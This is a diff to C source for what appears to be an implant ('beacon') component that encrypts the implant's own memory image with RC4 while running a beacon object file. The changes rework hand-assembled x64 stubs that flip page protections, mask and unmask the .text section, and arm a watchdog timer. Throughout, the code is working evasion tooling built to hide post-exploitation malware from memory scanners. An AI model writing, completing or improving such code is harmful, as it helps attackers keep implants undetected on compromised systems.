@@ -145,28 +145,35 @@ static BOOL bw_page_usable(void * p, DWORD * prot)
 	return TRUE;
 }
 
-/* flip every block to RW (returns FALSE on failure - caller must undo) */
-static BOOL bw_blocks_to_rw(BW_BLOCK * blocks, int n)
+/* flip every non-.text block to RW (the .text flip happens inside
+ * enter_stub, after the mask loop no longer needs .text executable;
+ * returns FALSE on failure - caller must undo) */
+static BOOL bw_blocks_to_rw(BW_BLOCK * blocks, int n, int text_idx)
 {
 	int i;
 	DWORD old = 0;
 
 	for (i = 0; i < n; i++) {
+		if (i == text_idx)
+			continue;
 		if (!VirtualProtect(blocks[i].ptr, blocks[i].len, PAGE_READWRITE, &old))
 			return FALSE;
 	}
 	return TRUE;
 }
 
-/* restore the recorded protections; safe from any thread post-unmask */
-static void bw_blocks_restore(BW_BLOCK * blocks, int n)
+/* restore the recorded protections; plain C - only ever called from the
+ * window teardown, after the exit stub put .text back (so IAT works) */
+static void bw_blocks_restore(BW_BLOCK * blocks, int n, int text_idx)
 {
 	int i;
 	DWORD old = 0;
 
-	for (i = 0; i < n; i++)
+	for (i = 0; i < n; i++) {
+		if (i == text_idx)
+			continue;
 		VirtualProtect(blocks[i].ptr, blocks[i].len, blocks[i].orig_prot, &old);
-	FlushInstructionCache(GetCurrentProcess(), blocks[0].ptr, 0);
+	}
 }
 
 /* Snapshot the whole image (header page + every section except the
@@ -375,8 +382,10 @@ static void __stdcall bw_watchdog_rest(BW_CTX * ctx)
 		bw_rc4(ctx->sf032, ctx->blocks[i].ptr, ctx->blocks[i].len,
 		       ctx->key, (unsigned int)i);
 	}
-	bw_blocks_restore(ctx->blocks, ctx->nblocks);
-	/* the BOF thread's exit_stub will see state==CLOSED and just ret */
+	/* .text protection was restored by the winning stub; the remaining
+	 * blocks' protections are restored by the window teardown on the BOF
+	 * thread (bw_blocks_restore). The exit_stub sees state==CLOSED and
+	 * just rets. */
 }
 
 static BOOL bw_build_pages(void)
@@ -396,7 +405,14 @@ static BOOL bw_build_pages(void)
 	memset(g_bw_stubs, 0, 0x1000);
 	p = g_bw_stubs;
 
-	/* ---- enter_stub ---- */
+	/* ---- enter_stub (called from C, rsp%16==8; .text still plaintext) ----
+	 * sub rsp,8; mov r11,exit; push r11; sub rsp,0x28      -> rsp%16==0
+	 * mov rax,[rip+ctx]
+	 * VirtualProtect(u_text.Buffer, len, PAGE_RW, &ctx->vp_old)   (.text RW)
+	 * sf032(u_text, u_key)          <- .text masked, executing the page
+	 * add rsp,0x28 -> 8
+	 * mov rcx,[ctx->args]; mov edx,[ctx->alen]; jmp [ctx->entry]
+	 */
 	e = p + BW_ENTER_OFF;
 	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x08;            /* sub rsp,8 */
 	e += 4;
@@ -407,12 +423,22 @@ static BOOL bw_build_pages(void)
 	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x28;            /* sub rsp,0x28 */
 	e += 4;
 	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
-	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, 0x0C0));
+	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x50;            /* mov rcx,[rax+0x50] */
+	e += 4;
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov rdx,[rax+0x58] */
+	e += 4;
+	e[0] = 0x41; e[1] = 0xB8; e[2] = 0x04; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* mov r8d,4 (PAGE_READWRITE) */
+	e += 6;
+	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
+	e += 4;
+	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x78;                          /* call [rax+0x78] VP->RW */
+	e += 3;
 	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
 	e += 4;
 	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
 	e += 4;
-	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call [rax+0x18] */
+	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call [rax+0x18] sf032 */
 	e += 3;
 	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x28;            /* add rsp,0x28 */
 	e += 4;
@@ -422,48 +448,72 @@ static BOOL bw_build_pages(void)
 	e += 3;
 	e[0] = 0xFF; e[1] = 0x60; e[2] = 0x20;                          /* jmp [rax+0x20] */
 	e += 3;
-	if ((int)(e - (p + BW_ENTER_OFF)) > 0x40)
+	if ((int)(e - (p + BW_ENTER_OFF)) > 0x50)
 		return FALSE;
 
-	/* ---- exit_stub ---- */
+	/* ---- exit_stub (BOF's ret lands here, rsp%16==0, .text=RW-cipher) ----
+	 * mov rax,[rip+ctx]; mov ecx,2; xchg ecx,[rax]; cmp ecx,1; jne ret
+	 * winner: sf032(.text plaintext again)
+	 *         VirtualProtect(.text, len, ctx->text_prot, &ctx->vp_old)
+	 *         FlushInstructionCache((HANDLE)-1, .text, len)  [cross-core: watchdog]
+	 * ret  (loser path: the watchdog already restored everything)
+	 */
 	e = p + BW_EXIT_OFF;
 	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
-	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, 0x0C0));
+	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
 	e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
 	e += 5;
 	e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
 	e += 2;
 	e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
 	e += 3;
-	e[0] = 0x75; e[1] = 0x13;                                        /* jne skip (+19) */
+	e[0] = 0x75; e[1] = 0x36;                                        /* jne ret (+0x36) */
 	e += 2;
-	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x30;            /* sub rsp,0x30 */
-	e += 4;
 	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
 	e += 4;
 	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
 	e += 4;
-	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call [rax+0x18] */
+	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call sf032 */
 	e += 3;
-	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x30;            /* add rsp,0x30 */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x50;            /* mov rcx,[rax+0x50] */
 	e += 4;
-	/* skip: */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov rdx,[rax+0x58] */
+	e += 4;
+	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x74] */
+	e = bw_put32(e + 3, 0x74);
+	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
+	e += 4;
+	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x78;                          /* call VP->orig(RX) */
+	e += 3;
+	e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* mov rcx,-1 */
+	e += 7;
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] */
+	e += 4;
+	e[0] = 0x4C; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov r8,[rax+0x58] */
+	e += 4;
+	e[0] = 0xFF; e[1] = 0x90;                                        /* call [rax+0x80] flush */
+	e = bw_put32(e + 2, 0x80);
 	e[0] = 0xC3;                                                     /* ret */
 	e += 1;
-	if ((int)(e - (p + BW_EXIT_OFF)) > 0x40)
+	if ((int)(e - (p + BW_EXIT_OFF)) > 0x50)
 		return FALSE;
 
-	/* ---- watchdog_stub ---- */
+	/* ---- watchdog_stub (timer callback, rsp%16==8; fires mid-BOF) ----
+	 * same claim+restore sequence, then tail-jumps the C rest-unmask:
+	 * sub rsp,0x28; sf032(.text); VP->RX; flush; add rsp,0x28
+	 * mov rcx,rax; jmp [rip+0] -> bw_watchdog_rest  (data qword follows)
+	 * wd_ret: ret
+	 */
 	e = p + BW_WATCH_OFF;
 	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
-	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, 0x0C0));
+	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
 	e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
 	e += 5;
 	e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
 	e += 2;
 	e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
 	e += 3;
-	e[0] = 0x75; e[1] = 0x24;                                        /* jne wd_ret (+36) */
+	e[0] = 0x75; e[1] = 0x4F;                                        /* jne wd_ret (+0x4F) */
 	e += 2;
 	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x28;            /* sub rsp,0x28 */
 	e += 4;
@@ -471,25 +521,44 @@ static BOOL bw_build_pages(void)
 	e += 4;
 	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
 	e += 4;
-	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call [rax+0x18] */
+	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call sf032 */
 	e += 3;
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x50;            /* mov rcx,[rax+0x50] */
+	e += 4;
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov rdx,[rax+0x58] */
+	e += 4;
+	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x74] */
+	e = bw_put32(e + 3, 0x74);
+	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
+	e += 4;
+	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x78;                          /* call VP->RX */
+	e += 3;
+	e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* mov rcx,-1 */
+	e += 7;
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] */
+	e += 4;
+	e[0] = 0x4C; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov r8,[rax+0x58] */
+	e += 4;
+	e[0] = 0xFF; e[1] = 0x90;                                        /* call flush */
+	e = bw_put32(e + 2, 0x80);
 	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x28;            /* add rsp,0x28 */
 	e += 4;
 	e[0] = 0x48; e[1] = 0x89; e[2] = 0xC1;                          /* mov rcx,rax */
 	e += 3;
 	e[0] = 0xFF; e[1] = 0x25;                                        /* jmp qword [rip+0] */
 	{
+		/* the data qword sits at the instruction end = current e + 6 */
 		unsigned long long rest = (unsigned long long)(size_t)bw_watchdog_rest;
-		memcpy(e + 6, &rest, 8); /* the qword the jmp dereferences sits at rip == insn end */
+		memcpy(e + 6, &rest, 8);
 	}
 	e += 14;
 	e[0] = 0xC3;                                                     /* wd_ret: ret */
 	e += 1;
-	if ((int)(e - (p + BW_WATCH_OFF)) > 0x3F)
+	if ((int)(e - (p + BW_WATCH_OFF)) > 0x70)
 		return FALSE;
 
-	/* the ctx qword both stubs load rip-relatively */
-	bw_put64(p + 0x0C0, (unsigned long long)(size_t)g_bw_ctx);
+	/* the ctx qword all three stubs load rip-relatively */
+	bw_put64(p + BW_CTXQ_OFF, (unsigned long long)(size_t)g_bw_ctx);
 
 	if (!VirtualProtect(p, 0x1000, PAGE_EXECUTE_READ, &old))
 		return FALSE;
@@ -512,11 +581,16 @@ void * bofwin_test_stub_page(void)
 BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms)
 {
 	BW_SF032 fn;
+	BW_CTX * ctx;                 /* stack-local: g_bw_ctx itself sits in
+	                               * .data and is ciphertext after the mask */
 	BW_BLOCK * blocks;
 	int nblocks, text_idx, i;
 	unsigned char key[16];
 	HANDLE timer = NULL;
 	void (*enter)(void);
+	void (*pVP)(void *, SIZE_T, DWORD, DWORD *);
+	void (*pFlush)(void *, const void *, SIZE_T);
+	unsigned int * k = (unsigned int *)key;
 
 	/* a background job thread could execute beacon code while the image is
 	 * ciphertext - the window is single-threaded only (same guard as the
@@ -530,79 +604,88 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	if (fn == NULL)
 		return FALSE;
 
-	blocks = (BW_BLOCK *)g_bw_ctx->storage;
+	/* capture every engine pointer BEFORE any masking: after the mask
+	 * loop, this function's only legal memory accesses are its own stack
+	 * and the (never-masked) private ctx/stub pages */
+	ctx = g_bw_ctx;
+	blocks = (BW_BLOCK *)ctx->storage;
 	nblocks = bw_snapshot(blocks, BW_MAX_BLOCKS, gparms->beacon_ptr, &text_idx);
 	if (nblocks < 2 || text_idx < 0)
 		return FALSE;
-
 	if (crypto_rng_get_bytes(key, (unsigned long)sizeof(key)) == 0)
 		return FALSE;
 
-	g_bw_ctx->state = BW_STATE_OPEN;
-	g_bw_ctx->rest_done = 0;
-	memcpy(g_bw_ctx->key, key, 16);
-	g_bw_ctx->sf032 = fn;
-	g_bw_ctx->entry = entry;
-	g_bw_ctx->args = args;
-	g_bw_ctx->alen = alen;
-	g_bw_ctx->blocks = blocks;
-	g_bw_ctx->nblocks = nblocks;
-	g_bw_ctx->text_idx = text_idx;
-	g_bw_ctx->u_text.Buffer = blocks[text_idx].ptr;
-	g_bw_ctx->u_text.Length = g_bw_ctx->u_text.MaximumLength = blocks[text_idx].len;
-	g_bw_ctx->u_key.Buffer = g_bw_ctx->key;
-	g_bw_ctx->u_key.Length = g_bw_ctx->u_key.MaximumLength = 16;
+	pVP = (void (*)(void *, SIZE_T, DWORD, DWORD *))VirtualProtect;
+	pFlush = (void (*)(void *, const void *, SIZE_T))FlushInstructionCache;
 
-	/* every block needs RW for the in-place RC4 (.text is RX in the
-	 * injected image); restored by the winner of each unmask path. Any
-	 * failure after this point MUST run the full unmask - the mask loop
-	 * below already scrambles memory. */
-	if (!bw_blocks_to_rw(blocks, nblocks))
+	ctx->state = BW_STATE_OPEN;
+	ctx->rest_done = 0;
+	memcpy(ctx->key, key, 16);
+	ctx->sf032 = fn;
+	ctx->entry = entry;
+	ctx->args = args;
+	ctx->alen = alen;
+	ctx->blocks = blocks;
+	ctx->nblocks = nblocks;
+	ctx->text_idx = text_idx;
+	ctx->text_prot = blocks[text_idx].orig_prot;
+	ctx->vp_old = 0;
+	ctx->pVirtualProtect = pVP;
+	ctx->pFlushIC = pFlush;
+	ctx->u_text.Buffer = blocks[text_idx].ptr;
+	ctx->u_text.Length = ctx->u_text.MaximumLength = blocks[text_idx].len;
+	ctx->u_key.Buffer = ctx->key;
+	ctx->u_key.Length = ctx->u_key.MaximumLength = 16;
+
+	/* the watchdog is created BEFORE the mask loop: its IAT entry lives in
+	 * .rdata, which is ciphertext from the mask on. One-shot, min 50ms -
+	 * the mask loop takes microseconds, it can never fire early. */
+	if (watchdog_ms < 50)
+		watchdog_ms = (watchdog_ms == 0) ? BW_DEFAULT_WATCHDOG_MS : 50;
+	if (!CreateTimerQueueTimer(&timer, NULL,
+	                           (WAITORTIMERCALLBACK)(void *)(g_bw_stubs + BW_WATCH_OFF),
+	                           NULL, watchdog_ms, 0,
+	                           WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION))
+		return FALSE; /* no watchdog -> no window (nothing masked yet) */
+
+	/* flip the non-.text blocks to RW, then mask them - plain RC4 loops,
+	 * .text stays plaintext and executable until enter_stub */
+	if (!bw_blocks_to_rw(blocks, nblocks, text_idx)) {
+		bw_blocks_restore(blocks, nblocks, text_idx);
+		DeleteTimerQueueTimer(NULL, timer, NULL);
+		ctx->state = BW_STATE_IDLE;
 		return FALSE;
-
-	/* mask everything except .text - plain RC4 loops are fine here, we are
-	 * still executing .text and it must stay plaintext until enter_stub */
+	}
 	for (i = 0; i < nblocks; i++) {
 		if (i != text_idx)
 			bw_rc4(fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
 	}
 
-	/* one-shot watchdog BEFORE entering: a BOF that never returns must not
-	 * leave the process masked forever */
-	if (watchdog_ms == 0)
-		watchdog_ms = BW_DEFAULT_WATCHDOG_MS;
-	if (!CreateTimerQueueTimer(&timer, NULL,
-	                           (WAITORTIMERCALLBACK)(void *)(g_bw_stubs + BW_WATCH_OFF),
-	                           NULL, watchdog_ms, 0,
-	                           WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION)) {
-		/* no watchdog -> no window: undo the mask and run the BOF plainly */
-		for (i = 0; i < nblocks; i++) {
-			if (i != text_idx)
-				bw_rc4(fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
-		}
-		bw_blocks_restore(blocks, nblocks);
-		g_bw_ctx->state = BW_STATE_IDLE;
-		return FALSE;
-	}
-
+	/* from here to the exit stub this thread may only touch: stack, ctx
+	 * page, stub page. enter_stub flips .text to RW, masks it (last block),
+	 * enters the BOF; the BOF's ret -> exit_stub restores .text + RX and
+	 * returns into THIS frame. */
 	enter = (void (*)(void))(g_bw_stubs + BW_ENTER_OFF);
-	enter(); /* the BOF's ret -> exit_stub -> ret lands right here */
+	enter();
 
-	/* .text is plaintext again (exit_stub restored it, or the watchdog did
-	 * and exit_stub saw state==CLOSED) */
-	if (InterlockedExchange(&g_bw_ctx->rest_done, 1) == 0) {
+	/* .text is plaintext+RX again (exit_stub, or the watchdog won and
+	 * exit_stub saw state==CLOSED). The image except .text is still
+	 * ciphertext here - unmask it via the stack-local ctx, restore the
+	 * remaining protections, THEN touch any IAT. */
+	if (InterlockedExchange(&ctx->rest_done, 1) == 0) {
 		for (i = 0; i < nblocks; i++) {
 			if (i != text_idx)
 				bw_rc4(fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
 		}
-		bw_blocks_restore(blocks, nblocks);
 	}
+	bw_blocks_restore(blocks, nblocks, text_idx);
 	DeleteTimerQueueTimer(NULL, timer, NULL);
 
 	memset(key, 0, sizeof(key));
-	memset(g_bw_ctx->key, 0, 16);
-	memset(g_bw_ctx->storage, 0, sizeof(g_bw_ctx->storage));
-	g_bw_ctx->state = BW_STATE_IDLE;
+	memset(ctx->key, 0, 16);
+	memset(ctx->storage, 0, sizeof(ctx->storage));
+	ctx->state = BW_STATE_IDLE;
+	(void)k;
 	return TRUE;
 }
 
